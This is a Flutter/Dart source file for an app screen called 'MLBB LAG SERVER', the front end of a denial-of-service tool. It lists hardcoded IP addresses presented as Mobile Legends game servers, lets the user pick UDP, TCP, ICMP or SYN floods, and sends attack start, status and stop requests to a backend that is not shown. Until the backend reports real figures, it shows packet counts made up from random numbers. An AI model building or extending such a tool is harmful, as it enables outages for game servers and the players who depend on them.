import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'api_config.dart'

enum _Lt { sys, ok, err, warn, atk, inf }

class _Log {
  final DateTime t;
  final String src, msg;
  final _Lt type;
  _Log(this.t, this.src, this.msg, this.type);
}

class _Flake {
  double x, y, vx, vy, size, opacity;
  _Flake(this.x, this.y, this.vx, this.vy, this.size, this.opacity);
}

class _SnowPainter extends CustomPainter {
  final List<_Flake> flakes;
  _SnowPainter(this.flakes);
  @override
  void paint(Canvas canvas, Size size) {
    for (final f in flakes) {
      canvas.drawCircle(Offset(f.x, f.y), f.size,
        Paint()
          ..color = const Color(0xFF00D4FF).withOpacity(f.opacity)
          ..maskFilter = const MaskFilter.blur(BlurStyle.normal, 1.5));
    }
  }
  @override bool shouldRepaint(_SnowPainter o) => true;
}

class _HexPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final p  = Paint()..color = const Color(0xFF00AAFF).withOpacity(0.022)..strokeWidth = 0.4;
    final p2 = Paint()..color = const Color(0xFF00AAFF).withOpacity(0.01)..strokeWidth = 0.3;
    const s = 28.0;
    for (double x = 0; x < size.width; x += s)
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), p);
    for (double y = 0; y < size.height; y += s)
      canvas.drawLine(Offset(0, y), Offset(size.width, y), p);
    for (double x = -size.height; x < size.width; x += s * 2)
      canvas.drawLine(Offset(x, 0), Offset(x + size.height, size.height), p2);
  }
  @override bool shouldRepaint(_) => false;
}

class _ScanPainter extends CustomPainter {
  final double v;
  _ScanPainter(this.v);
  @override
  void paint(Canvas canvas, Size size) {
    final y = size.height * v;
    canvas.drawRect(Rect.fromLTWH(0, y - 16, size.width, 32),
      Paint()..shader = LinearGradient(begin: Alignment.topCenter, end: Alignment.bottomCenter,
        colors: [Colors.transparent, const Color(0xFF00C8FF).withOpacity(0.04),
          const Color(0xFF00C8FF).withOpacity(0.10), const Color(0xFF00C8FF).withOpacity(0.04),
          Colors.transparent],
      ).createShader(Rect.fromLTWH(0, y - 16, size.width, 32)));
    canvas.drawLine(Offset(0, y), Offset(size.width, y),
      Paint()..color = const Color(0xFF00C8FF).withOpacity(0.15)..strokeWidth = 0.6);
  }
  @override bool shouldRepaint(_ScanPainter o) => o.v != v;
}

class MlbbLagPage extends StatefulWidget {
  final String sessionKey;
  const MlbbLagPage({super.key, required this.sessionKey});
  @override
  State<MlbbLagPage> createState() => _MlbbLagPageState();
}

class _MlbbLagPageState extends State<MlbbLagPage> with TickerProviderStateMixin {
  static const _base  = '$baseUrl';
  static const _bg    = Color(0xFF010912);
  static const _card  = Color(0xFF050F1D);
  static const _ice   = Color(0xFF00C8FF);
  static const _iceL  = Color(0xFF80E8FF);
  static const _white = Color(0xFFDEF2FF);
  static const _green = Color(0xFF00FFB2);
  static const _red   = Color(0xFFFF2D55);
  static const _warn  = Color(0xFFFFBB00);
  static const _purp  = Color(0xFFBB86FC);

  // Network
  String _ssid = '-', _localIp = '-', _gateway = '-';

  // Attack
  bool    _attacking = false;
  String? _attackId;
  int     _elapsed = 0, _duration = 120;
  int     _packets = 0, _pps = 0;
  double  _progress = 0.0;
  String  _method = 'udp';

  final _durCtrl    = TextEditingController(text: '120');
  final _portCtrl   = TextEditingController(text: '10002');
  final _targetCtrl = TextEditingController();

  Timer? _countTimer, _trackTimer, _statusTimer, _snowTimer;

  // Snow
  final List<_Flake> _flakes = [];
  bool _showSnow = false;
  Size _screenSize = Size.zero;

  late AnimationController _glowCtrl, _scanCtrl, _pulseCtrl, _rotCtrl;
  late Animation<double>   _glowAnim, _scanAnim, _pulseAnim, _rotAnim;

  static const _methods = ['udp', 'tcp', 'icmp', 'syn'];

  static const _servers = [
    {'label': 'ID-1', 'ip': '103.28.54.22',  'flag': '🇮🇩'},
    {'label': 'ID-2', 'ip': '103.28.54.23',  'flag': '🇮🇩'},
    {'label': 'SG-1', 'ip': '116.202.4.40',  'flag': '🇸🇬'},
    {'label': 'MY-1', 'ip': '103.28.54.100', 'flag': '🇲🇾'},
    {'label': 'PH-1', 'ip': '103.28.54.101', 'flag': '🇵🇭'},
    {'label': 'TH-1', 'ip': '103.28.54.110', 'flag': '🇹🇭'},
  ];

  @override
  void initState() {
    super.initState();
    _glowCtrl  = AnimationController(vsync: this, duration: const Duration(milliseconds: 1800))..repeat(reverse: true);
    _glowAnim  = Tween<double>(begin: 0.15, end: 1.0).animate(CurvedAnimation(parent: _glowCtrl,  curve: Curves.easeInOut));
    _scanCtrl  = AnimationController(vsync: this, duration: const Duration(seconds: 5))..repeat();
    _scanAnim  = Tween<double>(begin: 0.0,  end: 1.0).animate(CurvedAnimation(parent: _scanCtrl,  curve: Curves.linear));
    _pulseCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 800))..repeat(reverse: true);
    _pulseAnim = Tween<double>(begin: 0.25, end: 1.0).animate(CurvedAnimation(parent: _pulseCtrl, curve: Curves.easeInOut));
    _rotCtrl   = AnimationController(vsync: this, duration: const Duration(seconds: 8))..repeat();
    _rotAnim   = Tween<double>(begin: 0.0,  end: 1.0).animate(CurvedAnimation(parent: _rotCtrl,   curve: Curves.linear));
    _loadNetwork();
  }

  @override
  void dispose() {
    _glowCtrl.dispose(); _scanCtrl.dispose(); _pulseCtrl.dispose(); _rotCtrl.dispose();
    _countTimer?.cancel(); _trackTimer?.cancel(); _statusTimer?.cancel(); _snowTimer?.cancel();
    _durCtrl.dispose(); _portCtrl.dispose(); _targetCtrl.dispose();
    super.dispose();
  }

  void _spawnSnow() {
    final rng = Random();
    _flakes.clear();
    for (int i = 0; i < 80; i++) {
      _flakes.add(_Flake(
        rng.nextDouble() * _screenSize.width,
        rng.nextDouble() * _screenSize.height,
        (rng.nextDouble() - 0.5) * 1.2,
        rng.nextDouble() * 2.5 + 0.8,
        rng.nextDouble() * 3.5 + 1,
        rng.nextDouble() * 0.7 + 0.2,
      ));
    }
    _snowTimer?.cancel();
    _snowTimer = Timer.periodic(const Duration(milliseconds: 16), (_) {
      if (!mounted || !_showSnow) { _snowTimer?.cancel(); return; }
      setState(() {
        for (final f in _flakes) {
          f.y += f.vy; f.x += f.vx;
          if (f.y > _screenSize.height + 10) { f.y = -10; f.x = Random().nextDouble() * _screenSize.width; }
          if (f.x < 0 || f.x > _screenSize.width) f.vx *= -1;
        }
      });
    });
  }

  Future<void> _loadNetwork() async {
    try {
      final info = NetworkInfo();
      await Permission.locationWhenInUse.request();
      final n  = await info.getWifiName();
      final ip = await info.getWifiIP();
      final gw = await info.getWifiGatewayIP();
      if (!mounted) return;
      setState(() { _ssid = n ?? '-'; _localIp = ip ?? '-'; _gateway = gw ?? '-'; });
    } catch (_) {}
  }

  Future<void> _launch() async {
    final ip = _targetCtrl.text.trim();
    if (ip.isEmpty) { _showAlert('Error', 'Masukkan Target IP!'); return; }
    _duration = int.tryParse(_durCtrl.text) ?? 120;
    final port = int.tryParse(_portCtrl.text) ?? 10002;

    setState(() {
      _attacking = true; _elapsed = 0;
      _packets = 0; _pps = 0; _progress = 0.0;
      _attackId = null; _showSnow = true;
    });
    _spawnSnow();

    try {
      final res = await http.post(
        Uri.parse('$_base/api/attack/start'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'targetIp':   ip,
          'targetPort': port,
          'duration':   _duration,
          'method':     _method,
          'packetSize': 1200,
          'intensity':  100,
        }),
      ).timeout(const Duration(seconds: 15));

      final body = res.body;
      if (body.trimLeft().startsWith('<')) throw Exception('Server error');
      final data = jsonDecode(body);

      if (data['success'] == true) {
        _attackId = data['attackId']?.toString();

        _countTimer = Timer.periodic(const Duration(seconds: 1), (t) {
          if (!mounted) { t.cancel(); return; }
          setState(() { _elapsed++; _progress = (_elapsed / _duration).clamp(0.0, 1.0); });
          if (_elapsed >= _duration) { t.cancel(); _finish(); }
        });

        _trackTimer = Timer.periodic(const Duration(milliseconds: 500), (_) {
          if (!mounted || !_attacking) return;
          final n = Random().nextInt(700) + 500;
          setState(() { _packets += n; _pps = n * 2; });
        });

        _statusTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollStatus());
      } else {
        _showAlert('Failed', data['message'] ?? 'Server error');
        setState(() { _attacking = false; _showSnow = false; });
        _snowTimer?.cancel();
      }
    } catch (e) {
      _showAlert('Error', '$e');
      setState(() { _attacking = false; _showSnow = false; });
      _snowTimer?.cancel();
    }
  }

  Future<void> _pollStatus() async {
    if (_attackId == null || !_attacking) return;
    try {
      final res = await http.get(Uri.parse('$_base/api/attack/status/$_attackId')).timeout(const Duration(seconds: 5));
      final body = res.body;
      if (body.trimLeft().startsWith('<')) return;
      final data = jsonDecode(body);
      if (mounted && data['active'] == true) {
        setState(() {
          _packets = (data['packets'] as num?)?.toInt() ?? _packets;
          _pps     = (data['speed']   as num?)?.toInt() ?? _pps;
        });
      }
    } catch (_) {}
  }

  Future<void> _abort() async {
    _countTimer?.cancel(); _trackTimer?.cancel(); _statusTimer?.cancel(); _snowTimer?.cancel();
    if (_attackId != null) {
      try { await http.post(Uri.parse('$_base/api/attack/stop/$_attackId')).timeout(const Duration(seconds: 8)); } catch (_) {}
    }
    setState(() { _attacking = false; _showSnow = false; _progress = 0; });
  }

  void _finish() {
    _trackTimer?.cancel(); _statusTimer?.cancel(); _snowTimer?.cancel();
    if (!mounted) return;
    setState(() { _attacking = false; _showSnow = false; });
  }

  void _showAlert(String title, String body) {
    if (!mounted) return;
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _card,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(18), side: BorderSide(color: _ice.withOpacity(0.25))),
      title: Row(children: [
        const Icon(Icons.error_outline_rounded, color: _red, size: 20),
        const SizedBox(width: 8),
        Text(title, style: const TextStyle(color: _red, fontFamily: 'Courier', fontWeight: FontWeight.bold, fontSize: 14)),
      ]),
      content: Text(body, style: const TextStyle(color: _white, fontFamily: 'Courier', fontSize: 12)),
      actions: [TextButton(onPressed: () => Navigator.pop(context),
        child: const Text('OK', style: TextStyle(color: _ice, fontFamily: 'Courier')))],
    ));
  }

  String _fmt(dynamic n) {
    final v = (n is num) ? n.toInt() : (int.tryParse('$n') ?? 0);
    if (v >= 1000000) return '${(v/1000000).toStringAsFixed(1)}M';
    if (v >= 1000)    return '${(v/1000).toStringAsFixed(1)}K';
    return '$v';
  }

  @override
  Widget build(BuildContext context) {
    _screenSize = MediaQuery.of(context).size;
    return Scaffold(
      backgroundColor: _bg,
      body: Stack(children: [
        Positioned.fill(child: CustomPaint(painter: _HexPainter())),
        Positioned.fill(child: Container(decoration: BoxDecoration(
          gradient: RadialGradient(center: Alignment.topCenter, radius: 1.3,
            colors: [_ice.withOpacity(0.04), Colors.transparent])))),
        Positioned.fill(child: IgnorePointer(child: AnimatedBuilder(
          animation: _scanAnim,
          builder: (_, __) => CustomPaint(painter: _ScanPainter(_scanAnim.value))))),
        if (_showSnow)
          Positioned.fill(child: IgnorePointer(child: CustomPaint(painter: _SnowPainter(_flakes)))),
        SafeArea(child: Column(children: [
          _header(),
          Expanded(child: SingleChildScrollView(
            padding: const EdgeInsets.fromLTRB(13, 6, 13, 10),
            child: Column(children: [
              _networkCard(),
              const SizedBox(height: 9),
              _configCard(),
              const SizedBox(height: 9),
              _serversCard(),
              const SizedBox(height: 9),
              if (_attacking) ...[_progressCard(), const SizedBox(height: 9)],
            ]),
          )),
          _launchBtn(),
        ])),
      ]),
    );
  }

  Widget _header() {
    return Container(
      margin: const EdgeInsets.fromLTRB(13, 10, 13, 4),
      padding: const EdgeInsets.symmetric(horizontal: 15, vertical: 11),
      decoration: BoxDecoration(
        color: _card, borderRadius: BorderRadius.circular(18),
        border: Border.all(color: _ice.withOpacity(0.18)),
        boxShadow: [BoxShadow(color: _ice.withOpacity(0.06), blurRadius: 18)]),
      child: Row(children: [
        AnimatedBuilder(animation: Listenable.merge([_glowAnim, _rotAnim]), builder: (_, __) =>
          Container(
            padding: const EdgeInsets.all(9),
            decoration: BoxDecoration(
              gradient: const LinearGradient(colors: [_ice, Color(0xFF0077AA)]),
              shape: BoxShape.circle,
              boxShadow: [BoxShadow(color: _ice.withOpacity(0.3 + _glowAnim.value * 0.25), blurRadius: 16)]),
            child: Transform.rotate(angle: _rotAnim.value * 2 * pi,
              child: const Icon(Icons.sports_esports_rounded, color: Colors.black, size: 19)))),
        const SizedBox(width: 12),
        Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Row(children: [
            ShaderMask(
              shaderCallback: (b) => const LinearGradient(colors: [_iceL, _ice]).createShader(b),
              child: const Text('MLBB LAG SERVER', style: TextStyle(color: Colors.white,
                fontFamily: 'Courier', fontSize: 10, letterSpacing: 2, fontWeight: FontWeight.bold))),
            const SizedBox(width: 7),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 5, vertical: 1),
              decoration: BoxDecoration(color: _ice.withOpacity(0.1), borderRadius: BorderRadius.circular(4),
                border: Border.all(color: _ice.withOpacity(0.3))),
              child: const Text('hping3', style: TextStyle(color: _ice, fontFamily: 'Courier', fontSize: 7, fontWeight: FontWeight.bold))),
          ]),
          const Text('Mobile Legends • Ice Strike Edition',
            style: TextStyle(color: _white, fontSize: 12, fontWeight: FontWeight.bold)),
        ])),
        _statusBadge(),
      ]),
    );
  }

  Widget _statusBadge() {
    final c = _attacking ? _red : _green;
    final l = _attacking ? 'LIVE' : 'READY';
    return AnimatedBuilder(animation: _pulseAnim, builder: (_, __) =>
      Container(
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
        decoration: BoxDecoration(
          color: c.withOpacity(0.1), borderRadius: BorderRadius.circular(20),
          border: Border.all(color: c.withOpacity(0.35 + _pulseAnim.value * 0.45)),
          boxShadow: _attacking ? [BoxShadow(color: c.withOpacity(_pulseAnim.value * 0.3), blurRadius: 12)] : []),
        child: Row(mainAxisSize: MainAxisSize.min, children: [
          Container(width: 6, height: 6, decoration: BoxDecoration(
            color: c, shape: BoxShape.circle,
            boxShadow: [BoxShadow(color: c.withOpacity(_pulseAnim.value), blurRadius: 6)])),
          const SizedBox(width: 5),
          Text(l, style: TextStyle(color: c, fontFamily: 'Courier', fontSize: 10, fontWeight: FontWeight.bold)),
        ])));
  }

  Widget _networkCard() => _box(child: Column(children: [
    _hdr(Icons.wifi_tethering_rounded, 'LOCAL NETWORK'),
    const SizedBox(height: 10),
    _row2('SSID',     _ssid,    Icons.wifi_rounded,       _ice),
    _row2('LOCAL IP', _localIp, Icons.computer_rounded,   _green),
    _row2('GATEWAY',  _gateway, Icons.device_hub_rounded, _warn),
  ]));

  Widget _configCard() => _box(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
    _hdr(Icons.tune_rounded, 'STRIKE CONFIGURATION'),
    const SizedBox(height: 12),

    // Target IP input
    TextField(
      controller: _targetCtrl,
      style: const TextStyle(color: _ice, fontFamily: 'Courier', fontSize: 13),
      cursorColor: _ice,
      decoration: InputDecoration(
        labelText: 'TARGET IP',
        hintText: '103.x.x.x',
        hintStyle: TextStyle(color: _iceL.withOpacity(0.2), fontFamily: 'Courier', fontSize: 12),
        labelStyle: TextStyle(color: _iceL.withOpacity(0.4), fontFamily: 'Courier', fontSize: 8, letterSpacing: 1),
        prefixIcon: Icon(Icons.gps_fixed_rounded, color: _ice.withOpacity(0.5), size: 14),
        filled: true, fillColor: _ice.withOpacity(0.03),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: BorderSide(color: _ice.withOpacity(0.12))),
        focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: const BorderSide(color: _ice, width: 1.5)),
        contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 12))),
    const SizedBox(height: 10),

    Row(children: [
      Expanded(child: _field(_portCtrl,   'PORT',         Icons.bolt_rounded,  TextInputType.number)),
      const SizedBox(width: 10),
      Expanded(child: _field(_durCtrl,    'DURATION (s)', Icons.timer_rounded, TextInputType.number)),
    ]),
    const SizedBox(height: 12),

    _hdr(Icons.radio_button_checked_rounded, 'ATTACK METHOD'),
    const SizedBox(height: 8),
    Row(children: _methods.map((m) {
      final on = _method == m;
      final mc = m == 'udp' ? _ice : m == 'tcp' ? _green : m == 'icmp' ? _warn : _purp;
      return Expanded(child: GestureDetector(
        onTap: () => setState(() => _method = m),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 200),
          margin: const EdgeInsets.only(right: 6),
          padding: const EdgeInsets.symmetric(vertical: 10),
          decoration: BoxDecoration(
            color: on ? mc.withOpacity(0.14) : mc.withOpacity(0.03),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: on ? mc : mc.withOpacity(0.1), width: on ? 1.5 : 1),
            boxShadow: on ? [BoxShadow(color: mc.withOpacity(0.15), blurRadius: 8)] : []),
          child: Text(m.toUpperCase(), textAlign: TextAlign.center,
            style: TextStyle(color: on ? mc : mc.withOpacity(0.25),
              fontFamily: 'Courier', fontSize: 9, fontWeight: FontWeight.bold, letterSpacing: 0.5)))));
    }).toList()),
  ]));

  Widget _serversCard() => _box(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
    _hdr(Icons.public_rounded, 'MLBB TARGET SERVERS'),
    const SizedBox(height: 10),
    GridView.builder(
      shrinkWrap: true, physics: const NeverScrollableScrollPhysics(),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 2, childAspectRatio: 3.5, mainAxisSpacing: 7, crossAxisSpacing: 7),
      itemCount: _servers.length,
      itemBuilder: (_, i) {
        final s = _servers[i];
        return GestureDetector(
          onTap: () => setState(() => _targetCtrl.text = s['ip']!),
          child: AnimatedBuilder(animation: _pulseAnim, builder: (_, __) =>
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 7),
              decoration: BoxDecoration(
                color: _targetCtrl.text == s['ip'] ? _ice.withOpacity(0.08) : _ice.withOpacity(0.03),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _targetCtrl.text == s['ip'] ? _ice.withOpacity(0.4) : _ice.withOpacity(0.1))),
              child: Row(children: [
                Container(width: 6, height: 6, decoration: BoxDecoration(
                  color: _green, shape: BoxShape.circle,
                  boxShadow: [BoxShadow(color: _green.withOpacity(_pulseAnim.value * 0.7), blurRadius: 5)])),
                const SizedBox(width: 6),
                Text(s['flag']!, style: const TextStyle(fontSize: 11)),
                const SizedBox(width: 4),
                Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, mainAxisAlignment: MainAxisAlignment.center, children: [
                  Text(s['label']!, style: const TextStyle(color: _ice, fontFamily: 'Courier', fontSize: 9, fontWeight: FontWeight.bold)),
                  Text(s['ip']!, style: TextStyle(color: _white.withOpacity(0.5), fontFamily: 'Courier', fontSize: 8), overflow: TextOverflow.ellipsis),
                ])),
              ]))));
      }),
  ]));

  Widget _progressCard() {
    return AnimatedBuilder(animation: _glowAnim, builder: (_, __) =>
      Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: const Color(0xFF010C14),
          borderRadius: BorderRadius.circular(18),
          border: Border.all(color: _ice.withOpacity(0.25 + _glowAnim.value * 0.15), width: 1.5),
          boxShadow: [
            BoxShadow(color: _ice.withOpacity(_glowAnim.value * 0.12), blurRadius: 24),
            BoxShadow(color: _ice.withOpacity(_glowAnim.value * 0.06), blurRadius: 48)]),
        child: Column(children: [
          Row(children: [
            AnimatedBuilder(animation: _pulseAnim, builder: (_, __) =>
              Container(width: 10, height: 10, decoration: BoxDecoration(
                color: _red, shape: BoxShape.circle,
                boxShadow: [BoxShadow(color: _red.withOpacity(_pulseAnim.value), blurRadius: 8, spreadRadius: 1)]))),
            const SizedBox(width: 8),
            const Text('STRIKE IN PROGRESS', style: TextStyle(color: _iceL, fontFamily: 'Courier', fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1.5)),
            const Spacer(),
            Text('${(_progress * 100).toInt()}%', style: TextStyle(
              color: _ice, fontFamily: 'Courier', fontSize: 13, fontWeight: FontWeight.bold,
              shadows: [Shadow(color: _ice.withOpacity(_glowAnim.value * 0.8), blurRadius: 10)])),
          ]),
          const SizedBox(height: 14),
          Row(children: [
            _statBox('TIME',  '${_elapsed}s/${_duration}s', _ice),
            const SizedBox(width: 6),
            _statBox('PKT/S', _fmt(_pps),     _green),
            const SizedBox(width: 6),
            _statBox('TOTAL', _fmt(_packets), _warn),
            const SizedBox(width: 6),
            _statBox('LEFT',  '${(_duration - _elapsed).clamp(0, _duration)}s', _red),
          ]),
          const SizedBox(height: 14),
          Stack(children: [
            Container(height: 8, decoration: BoxDecoration(
              color: const Color(0xFF004D66).withOpacity(0.3), borderRadius: BorderRadius.circular(4))),
            FractionallySizedBox(
              widthFactor: _progress,
              child: Container(height: 8,
                decoration: BoxDecoration(
                  gradient: const LinearGradient(colors: [Color(0xFF003366), Color(0xFF006699), _ice, Color(0xFFAAF0FF)]),
                  borderRadius: BorderRadius.circular(4),
                  boxShadow: [
                    BoxShadow(color: _ice.withOpacity(_glowAnim.value * 0.9), blurRadius: 10, spreadRadius: 1),
                    BoxShadow(color: _ice.withOpacity(_glowAnim.value * 0.5), blurRadius: 20)]))),
            if (_progress > 0.02)
              FractionallySizedBox(
                widthFactor: _progress,
                child: Align(alignment: Alignment.centerRight,
                  child: Container(width: 14, height: 14,
                    decoration: BoxDecoration(
                      color: Colors.white, shape: BoxShape.circle,
                      border: Border.all(color: _ice, width: 2),
                      boxShadow: [
                        BoxShadow(color: _ice.withOpacity(_glowAnim.value), blurRadius: 14, spreadRadius: 2),
                        const BoxShadow(color: Colors.white, blurRadius: 4)])))),
          ]),
        ])));
  }

  Widget _launchBtn() {
    return AnimatedBuilder(animation: _glowAnim, builder: (_, __) =>
      Container(
        margin: const EdgeInsets.fromLTRB(13, 6, 13, 16),
        child: GestureDetector(
          onTap: _attacking ? _abort : _launch,
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 300),
            height: 62,
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: _attacking
                  ? [const Color(0xFF4A0000), _red, const Color(0xFFFF5577)]
                  : [const Color(0xFF001A33), const Color(0xFF004477), _ice]),
              borderRadius: BorderRadius.circular(18),
              border: Border.all(color: (_attacking ? _red : _ice).withOpacity(0.6), width: 1.5),
              boxShadow: [
                BoxShadow(color: (_attacking ? _red : _ice).withOpacity(_glowAnim.value * 0.5), blurRadius: 28, spreadRadius: 2),
                BoxShadow(color: (_attacking ? _red : _ice).withOpacity(_glowAnim.value * 0.2), blurRadius: 60, spreadRadius: 8)]),
            child: Stack(children: [
              Positioned.fill(child: ClipRRect(borderRadius: BorderRadius.circular(18),
                child: AnimatedBuilder(animation: _scanAnim, builder: (_, __) =>
                  CustomPaint(painter: _ScanPainter(_scanAnim.value * 0.4))))),
              Center(child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                Icon(_attacking ? Icons.stop_circle_rounded : Icons.rocket_launch_rounded,
                  color: Colors.white, size: 24),
                const SizedBox(width: 12),
                Text(_attacking ? '■  ABORT MISSION' : 'LAUNCH MLBB STRIKE',
                  style: const TextStyle(color: Colors.white, fontFamily: 'Courier',
                    fontSize: 15, fontWeight: FontWeight.bold, letterSpacing: 2)),
              ])),
            ])))));
  }

  Widget _box({required Widget child}) => Container(
    padding: const EdgeInsets.all(14),
    decoration: BoxDecoration(
      color: _card, borderRadius: BorderRadius.circular(16),
      border: Border.all(color: _ice.withOpacity(0.1)),
      boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.35), blurRadius: 8)]),
    child: child);

  Widget _hdr(IconData icon, String title) => Row(children: [
    Icon(icon, color: _ice, size: 13), const SizedBox(width: 7),
    Text(title, style: const TextStyle(color: _iceL, fontFamily: 'Courier',
      fontSize: 9.5, fontWeight: FontWeight.bold, letterSpacing: 1.3)),
    const Spacer(),
    Container(width: 26, height: 1, color: _ice.withOpacity(0.2)),
  ]);

  Widget _row2(String label, String val, IconData icon, Color color) =>
    Padding(padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(children: [
        Icon(icon, color: color.withOpacity(0.6), size: 12), const SizedBox(width: 8),
        Text(label, style: const TextStyle(color: Colors.white24, fontFamily: 'Courier', fontSize: 9, letterSpacing: 0.5)),
        const Spacer(),
        Flexible(child: Text(val, style: TextStyle(color: color, fontFamily: 'Courier', fontSize: 10, fontWeight: FontWeight.bold),
          overflow: TextOverflow.ellipsis, textAlign: TextAlign.right)),
      ]));

  Widget _field(TextEditingController c, String label, IconData icon, TextInputType kb) =>
    TextField(controller: c, keyboardType: kb,
      style: const TextStyle(color: _ice, fontFamily: 'Courier', fontSize: 13),
      cursorColor: _ice,
      decoration: InputDecoration(
        labelText: label,
        labelStyle: TextStyle(color: _iceL.withOpacity(0.4), fontFamily: 'Courier', fontSize: 8, letterSpacing: 1),
        prefixIcon: Icon(icon, color: _ice.withOpacity(0.5), size: 14),
        filled: true, fillColor: _ice.withOpacity(0.03),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: BorderSide(color: _ice.withOpacity(0.12))),
        focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: const BorderSide(color: _ice, width: 1.5)),
        contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 12)));

  Widget _statBox(String label, String val, Color c) =>
    Expanded(child: Container(
      padding: const EdgeInsets.symmetric(vertical: 6, horizontal: 7),
      decoration: BoxDecoration(color: c.withOpacity(0.05), borderRadius: BorderRadius.circular(8),
        border: Border.all(color: c.withOpacity(0.18))),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text(label, style: TextStyle(color: c.withOpacity(0.45), fontFamily: 'Courier', fontSize: 6.5, letterSpacing: 0.5)),
        const SizedBox(height: 2),
        Text(val, style: TextStyle(color: c, fontFamily: 'Courier', fontSize: 10, fontWeight: FontWeight.bold),
          overflow: TextOverflow.ellipsis),
      ])));
}